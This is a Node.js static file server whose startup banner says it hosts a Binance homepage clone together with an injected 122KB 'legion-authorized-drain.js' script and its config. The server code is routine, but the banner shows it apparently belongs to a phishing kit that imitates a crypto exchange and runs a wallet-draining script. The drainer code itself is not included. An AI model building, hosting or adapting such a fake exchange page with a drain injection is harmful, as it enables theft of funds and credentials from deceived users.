const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3000;

const server = http.createServer((req, res) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);

  // Default to index.html for root
  let filePath = req.url === '/' ? 'index.html' : req.url;
  filePath = path.join(__dirname, filePath);

  // Security: prevent directory traversal
  if (!filePath.startsWith(__dirname)) {
    res.writeHead(403);
    res.end('Forbidden');
    return;
  }

  fs.readFile(filePath, (err, content) => {
    if (err) {
      console.log(`[ERROR] File not found: ${filePath}`);
      res.writeHead(404);
      res.end('Not Found');
      return;
    }

    // Determine content type
    const ext = path.extname(filePath).toLowerCase();
    let contentType = 'text/plain';
    if (ext === '.html') contentType = 'text/html';
    else if (ext === '.js') contentType = 'application/javascript';
    else if (ext === '.css') contentType = 'text/css';
    else if (ext === '.json') contentType = 'application/json';

    res.writeHead(200, { 'Content-Type': contentType });
    res.end(content);
  });
});

server.listen(PORT, 'localhost', () => {
  console.log(`
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║  🚀 BINANCE CLONE HOSTED ON LOCALHOST                     ║
║                                                            ║
║  URL: http://localhost:${PORT}                               ║
║                                                            ║
║  Files being served:                                       ║
║    ✅ index.html (Binance homepage clone)                 ║
║    ✅ legion-authorized-drain.js (122KB injection)        ║
║    ✅ legion-authorized-drain.css                         ║
║    ✅ authorized-config.json                              ║
║                                                            ║
║  All requests logged below...                             ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
  `);
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n\n[SERVER] Shutting down gracefully...');
  server.close(() => {
    console.log('[SERVER] Server closed');
    process.exit(0);
  });
});
